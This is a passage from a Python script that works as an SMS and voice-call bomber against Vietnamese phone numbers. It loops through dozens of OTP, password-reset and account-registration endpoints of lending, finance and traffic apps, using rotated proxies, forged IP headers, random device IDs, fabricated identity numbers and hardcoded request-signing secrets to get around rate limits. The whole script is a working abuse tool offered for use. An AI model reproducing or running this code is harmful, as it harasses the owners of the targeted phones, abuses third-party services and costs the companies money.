            ok = resp.status_code in (200, 201) or data.get('errorCode') == 400001000
            print(f"GT365-Register | {'OK' if ok else 'X'} [{resp.status_code}]")
            return ok
    except Exception as e:
        print(f"GT365-Register | ~> Lỗi: {type(e).__name__}: {e}")


async def giaothong365_forgot(phone):
    phone_fmt = phone if phone.startswith('0') else '0' + phone.lstrip('0')
    device_id = str(uuid.uuid4()).upper()
    captcha = _load_gt365_captcha() or _GT365_CAPTCHA_FORGOT
    try:
        async with _make_client(timeout=15, follow_redirects=True, verify=False) as client:
            await client.get(
                'https://api-v2.giaothong365.vn/app/config/api/v1.0/p/all?platform=ios',
                headers=_gt365_headers(device_id),
            )
            resp = await client.put(
                'https://api-v2.giaothong365.vn/openid/api/v1.0/account/p/forgot-password/request-otp',
                headers=_gt365_headers(device_id),
                json={'phoneNumber': phone_fmt, 'captchaToken': captcha},
            )
            ok = resp.status_code in (200, 201)
            print(f"GT365-Forgot | {'OK' if ok else 'X'} [{resp.status_code}]")
            return ok
    except Exception as e:
        print(f"GT365-Forgot | ~> Lỗi: {type(e).__name__}: {e}")



_VUIAPP_URL = "https://api-vncdn.vuiapp.vn/graphql"


def generate_vuiapp_headers():
    device_id = str(uuid.uuid4()).upper()
    trace_id = uuid.uuid4().hex
    span_id = uuid.uuid4().hex[:16]
    cfnet, darwin = random.choice(_IOS_CFNETWORK)
    return {
        "Host": "api-vncdn.vuiapp.vn",
        "Accept": "*/*",
        "Accept-Language": "vi-VN",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/json",
        "Connection": "keep-alive",
        "User-Agent": f"RNClientApp/20260507113653 CFNetwork/{cfnet} Darwin/{darwin}",
        "x-app-version": "4.39.70",
        "x-platform": "ios",
        "x-device-id": device_id,
        "x-format-money": "json",
        "x-debug-otp": "false",
        "sentry-trace": f"{trace_id}-{span_id}",
        "baggage": f"sentry-environment=production,sentry-release=vn.vuiapp.m%404.39.61%2B20260325125922,sentry-public_key=2001cef5546e49dc843c73b5edd45a9a,sentry-trace_id={trace_id},sentry-org_id=402372"
    }

async def Call_VuiApp0(phone):
    headers = generate_vuiapp_headers()
    payload = {
        "query": "mutation resendAuthenticationOTP($payload: RequestResendOtpPayload!) {\n  requestResendOtp(payload: $payload) {\n    otp {\n      success\n      debug_otp\n      retryAfter\n      __typename\n    }\n    debug_otp\n    __typename\n  }\n}\n",
        "variables": {"payload": {"otpMethod": "Voice", "otpLength": 6, "phoneNumber": phone}},
        "operationName": "resendAuthenticationOTP",
    }
    try:
        async with _make_client(timeout=httpx.Timeout(30, connect=10), proxy=_current_proxy()) as client:
            r = await client.post(_VUIAPP_URL, headers=headers, json=payload)
        otp = (r.json().get("data") or {}).get("requestResendOtp") or {}
        ok = bool((otp.get("otp") or {}).get("success") or otp.get("debug_otp"))
        print(f"[VuiApp0] {r.status_code} | {r.text[:120]}")
        return ok
    except Exception as e:
        print(f"[VuiApp0] ERR {type(e).__name__}: {e}")
        return False


async def Call_VuiApp(phone):
    headers = generate_vuiapp_headers()
    phone_fmt = phone if phone.startswith("+") else f"+84{phone.lstrip('0')}"
    payload = {
        "query": "mutation resendAuthenticationOTP($payload: RequestResendOtpPayload!) {\n  requestResendOtp(payload: $payload) {\n    otp {\n      success\n      __typename\n    }\n    __typename\n  }\n}\n",
        "variables": {"payload": {"otpMethod": "Voice", "otpLength": 6, "phoneNumber": phone_fmt}},
        "operationName": "resendAuthenticationOTP",
    }
    try:
        async with _make_client(timeout=httpx.Timeout(30, connect=10), proxy=_current_proxy()) as client:
            r = await client.post(_VUIAPP_URL, headers=headers, json=payload)
        otp = (r.json().get("data") or {}).get("requestResendOtp") or {}
        ok = bool((otp.get("otp") or {}).get("success") or otp.get("debug_otp"))
        print(f"[VuiApp] {r.status_code} | {r.text[:120]}")
        return ok
    except Exception as e:
        print(f"[VuiApp] ERR {type(e).__name__}: {e}")
        return False


async def Call_VuiApp1(phone):
    headers = generate_vuiapp_headers()
    phone_fmt = phone if phone.startswith("+") else f"+84{phone.lstrip('0')}"
    payload = {
        "operationName": "requestChangePassword",
        "variables": {"phoneNumber": phone_fmt, "otpLength": 6},
        "query": (
            "mutation requestChangePassword($phoneNumber: PhoneNumber!, $otpLength: Int) {\n"
            "  requestChangePassword(phoneNumber: $phoneNumber, otpLength: $otpLength) {\n"
            "    requestId\n    otp { success retryAfter __typename }\n    __typename\n  }\n}\n"
        ),
    }
    try:
        async with _make_client(timeout=httpx.Timeout(30, connect=10), proxy=_current_proxy()) as client:
            r = await client.post(_VUIAPP_URL, headers=headers, json=payload)
        otp = (r.json().get("data") or {}).get("requestChangePassword") or {}
        ok = bool((otp.get("otp") or {}).get("success"))
        print(f"[VuiApp1] {r.status_code} | {r.text[:120]}")
        return ok
    except Exception as e:
        print(f"[VuiApp1] ERR {type(e).__name__}: {e}")
        return False


def _vnadmin_sign(data: dict, secret: str) -> str:
    sorted_obj = {k: data[k] for k in sorted(data.keys())}
    step1 = hashlib.md5(json.dumps(sorted_obj, separators=(",", ":")).encode()).hexdigest()
    step2 = hashlib.md5((step1 + secret).encode()).hexdigest().upper()
    return step2[::-1]


async def _vnadmin_request(phone, appkey, origin, url, secret):
    mob = "84" + phone.lstrip("0") if not phone.startswith("84") else phone
    data = {"mobilenumber": mob, "AppKey": appkey, "loading": True}
    data["sign"] = _vnadmin_sign(data, secret)
    try:
        async with _make_client(timeout=30, proxy=_current_proxy()) as client:
            r = await client.post(
                url, json=data,
                headers={
                    "Accept": "*/*", "Content-Type": "application/json",
                    "Origin": origin, "Referer": origin + "/",
                    "lang": "vi_VN",
                    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
                    "Sec-Fetch-Site": "same-site", "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Dest": "empty", "Accept-Language": "vi-VN,vi;q=0.9",
                    "Priority": "u=3, i", "Accept-Encoding": "gzip, deflate, br",
                },
            )
        return r.status_code == 200
    except Exception as e:
        print(f"[vnadmin/{appkey}] ERR {type(e).__name__}: {e}")
        return False


async def vnadmin_1(phone):
    return await _vnadmin_request(
        phone, "App1749282714",
        "https://internal.vnadmin.top",
        "https://api3.vnadmin.top/login/getSmsCode",
        "A2D2E55EB0A02888",
    )


async def vnadmin_2(phone):
    return await _vnadmin_request(
        phone, "App1715327022",
        "https://luckyv2.vnadmin.top",
        "https://api.vnadmin.top/login/getSmsCode",
        "A2D2E55EB0A02666",
    )


async def vnadmin_3(phone):
    return await _vnadmin_request(
        phone, "App1715922397",
        "https://moneytreev2.vnadmin.top",
        "https://api2.vnadmin.top/login/getSmsCode",
        "A2D2E55EB0A02777",
    )



async def vaygo(phone):
    phone_formatted = phone.lstrip("0")
    url = "https://api.vaygovn.com/v1/login/send/msm"
    headers = {
        "Host": "api.vaygovn.com", "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": random.choice(_XMH_UA_POOL),
        "Referer": "https://api.vaygovn.com/",
        "Accept-Language": "vi-VN,vi;q=0.9", "Priority": "u=3, i",
    }
    data = {
        "phone": phone_formatted, "type": "2",
        "chntoken": "", "sourse": "1",
        "ip2": get_random_ip(), "ip3": get_random_ipv6(),
    }
    try:
        async with httpx.AsyncClient(timeout=30, http2=False, proxy=_current_proxy()) as client:
            response = await client.post(url, headers=headers, data=data)
        print(f"📡 Status: {response.status_code}")
        return response.status_code == 200
    except Exception as e:
        print(f"❌ Unexpected Error: {e}")
        return False


async def anvay(phone):
    phone_formatted = phone.lstrip("0")
    url = "https://vnapi.anvay.asia/v1/login/send/msm"
    headers = {
        "Host": "vnapi.anvay.asia", "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": random.choice(_XMH_UA_POOL),
        "Referer": "https://vnapi.anvay.asia/",
        "Accept-Language": "vi-VN,vi;q=0.9", "Priority": "u=3, i",
    }
    data = {
        "phone": phone_formatted, "type": "2",
        "chntoken": "", "sourse": "1",
        "ip2": get_random_ip(), "ip3": get_random_ipv6(),
    }
    try:
        async with httpx.AsyncClient(timeout=30, http2=False, proxy=_current_proxy()) as client:
            response = await client.post(url, headers=headers, data=data)
        print(f"📡 Status: {response.status_code}")
        return response.status_code == 200
    except Exception as e:
        print(f"❌")
        return False


async def vaysuoi(phone):
    phone_formatted = phone.lstrip("0")
    url = "https://api.vaysuoi.com/v1/login/send/msm"
    headers = {
        "Host": "api.vaysuoi.com", "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://vaysuoi.com",
        "User-Agent": random.choice(_XMH_UA_POOL),
        "Referer": "https://vaysuoi.com/pages/v1/register/",
        "Accept-Language": "vi-VN,vi;q=0.9", "Priority": "u=3, i",
    }
    data = {
        "phone": phone_formatted, "type": "2",
        "chntoken": "", "sourse": "1",
        "ip2": get_random_ip(), "ip3": get_random_ipv6(),
    }
    try:
        async with httpx.AsyncClient(timeout=30, http2=False, proxy=_current_proxy()) as client:
            response = await client.post(url, headers=headers, data=data)
        print(f"📡 Status: {response.status_code}")
        return response.status_code == 200
    except Exception as e:
        print(f"{e}")
        return False


async def hicash(phone):
    phone_formatted = phone.lstrip("0")
    url = "https://api.hicash.fun/v1/login/send/msm"
    headers = {
        "Host": "api.hicash.fun", "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://h5.hicash.fun",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
        "Referer": "https://h5.hicash.fun/",
        "Accept-Language": "vi-VN,vi;q=0.9", "Priority": "u=3, i",
    }
    data = {
        "phone": phone_formatted, "type": "2",
        "chntoken": "", "sourse": "1",
        "ip2": get_random_ip(), "ip3": get_random_ipv6(),
    }
    try:
        async with httpx.AsyncClient(timeout=30, http2=False, proxy=_current_proxy()) as client:
            response = await client.post(url, headers=headers, data=data)
        print(f"📡 Status: {response.status_code}")
        return response.status_code == 200
    except Exception as e:
        print(f"{e}")
        return False

async def vayxanh(phone):
    headers_get = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "referer": "https://vayxanh.com/",
    }
    headers_post = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json;charset=utf-8",
        "origin": "https://lk.vayxanh.com",
        "referer": f"https://lk.vayxanh.com/?phone={phone}&amount=2000000&term=7",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "x-request-id": str(uuid.uuid4()),
    }
    cookies = {}
    try:
        async with httpx.AsyncClient(verify=False, timeout=30, proxy=_current_proxy()) as cl:
            resp_get = await cl.get(
                "https://lk.vayxanh.com/",
                params={
                    "phone": phone, "amount": "2000000", "term": "7",
                    "utm_source": "direct_vayxanh", "utm_medium": "organic",
                    "utm_campaign": "direct_vayxanh", "utm_content": "mainpage_submit",
                },
                headers=headers_get, cookies=cookies,
            )
            cookies.update(dict(resp_get.cookies))
            r = await cl.post(
                "https://lk.vayxanh.com/internal/client/otp/send",
                cookies=cookies, headers=headers_post,
                json={"data": {"phone": phone, "code": "resend", "channel": "ivr"}},
            )
        ok = r.status_code == 200
        if ok:
            print(f"[VayXanh] ✅ OK")
        else:
            print(f"[VayXanh] ❌ HTTP {r.status_code}: {r.text[:100]}")
        return ok
    except Exception as e:
        print(f"[VayXanh] ERR {type(e).__name__}: {e}")
        return False


async def lotte(phone):
    identity = (
        f"0310"
        f"{random.randint(0, 99):02d}"
        f"0"
        f"{random.randint(0, 99):02d}"
        f"1"
        f"{random.randint(0, 99):02d}"
    )
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'User-Agent': random.choice(_XMH_UA_POOL),
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
    }
    json_data = {
        'login': identity, 'phoneNumber': phone,
        'identityNumber': identity, 'changeRequired': True,
        'email': generate_email(),
    }
    try:
        async with _make_client(timeout=httpx.Timeout(30, connect=10), proxy=_current_proxy()) as client:
            r = await client.post(
                'https://digital.lottefinance.vn/lfd-api/api/account/register',
                headers=headers, json=json_data,
            )
        print(f"LOTTEFINANCE | -> OK [{r.status_code}]")
        return r.status_code == 200
    except Exception:
        print("LOTTEFINANCE | ~> Lỗi")
        return False


_FINVAY_HEADERS = {
    "Content-Type": "application/json",
    "Accept": "application/json",
    "Accept-Charset": "UTF-8",
    "Accept-Language": "vi-VN,vi;q=0.9",
    "User-Agent": "ktor-client",
}


async def Call_ConCac29(phone):
    try:
        async with _make_client(timeout=30, proxy=_current_proxy()) as client:
            r = await client.post(
                "https://h5web.thudofinance.com/fivios/finv/neglected",
                json={"phone": phone},
                headers=_FINVAY_HEADERS,
            )
        print(r.status_code)
        return r.status_code == 200
    except Exception:
        return False


async def main():
    phones = sys.argv[1:21]
    if not phones:
        print("Usage: python oki.py <phone1> [phone2] ...")
        sys.exit(1)

    print("[ChangeIP] Đang đổi IP proxy...")
    await _doi_ip()

    all_funcs = [
        (Call_Hedgyv,),
        (Call_VuiApp0,),
        (Call_MuaVayLoan,),
        (giaothong365_register,),
        (Call_SaoThinhVuong,),
        (Call_Reve_SMS,),
        (call8,),
        (Call_UVWallet,),
        (Call_Lavi_SMS,),
        (Call_MarVay_New,),
        (Call_VuiApp1,),
        (Call_NganNgan,),
        (Call_HTC_SMS,),
        (vaysuoi,),
        (Vay_Nhanh_SMS,),
        (Call_VnCreSms,),
        (Call_PTV_SMS,),
        (FB_Finance_SMS,),
        (Call_Vay24h,),
        (Call_Petro_SMS,),
        (Call_AChau_SMS,),
        (anvay,),
        (Call_HappyGoo,),
        (Call_HappyGoo_Voice,),
        (Call_SenVay,),
        (Call_LuckyTien,),
        (Call_LuckyTien_Voice,),
        (Call_EasyOkVN,),
        (Call_EasyOkVN_Voice,),
        (Call_VuiApp,),
        (Call_ITake,),
        (Call_QQ_SMS,),
        (seabankasset,),
        (vaygo,),
        (Call_Izion24_SMS,),
        (Call_Izion24_Voice,),
        (Call_ConCac27,),
        (Call_Tien24hPro,),
        (giaothong365_forgot,),
        (Call_Wan_SMS,),
        (Call_VNCreCall,),
        (Call_FinVuiTeck,),
        (Call_MarVay_SMS,),
        (Call_TuiTien,),
        (Call_MoneyCashLoan,),
        (Call_V88Dong,),
        (Call_V88DongVoice,),
        (hicash,),
        (lotte,),
        (Call_ConCac29,),
        (vnadmin_2,),
        (Call_VayDep365,),
        (sentSms_FvBanana,),
        (sentSms1,),
        (vayxanh,),
        (vnadmin_1,),
        (vnadmin_3,),
    ]

    async def safe_call(func, phone):
        try:
            return await asyncio.wait_for(func(phone), timeout=25)
        except Exception as e:
            print(f"[{func.__name__}] ERR {type(e).__name__}: {e}")
            return False

    max_cycles = 1
    cycle = 0
    while cycle < max_cycles:
        cycle += 1
        print(f"\n{'='*50}\n[VÒNG {cycle}/{max_cycles}] Bắt đầu {len(all_funcs)} hàm\n{'='*50}")
        for func, *_ in all_funcs:
            results = await asyncio.gather(*[safe_call(func, phone) for phone in phones])
            if any(results):
                print(f"[{func.__name__}] ✅ OK — đợi 2s ->  8s ")
                await asyncio.sleep(random.randint(6, 8))
        print(f"[VÒNG {cycle}/{max_cycles}] Hoàn thành.")
    print(f"\nĐã chạy đủ {max_cycles} vòng, dừng chương trình.")


if __name__ == "__main__":
    asyncio.run(main())
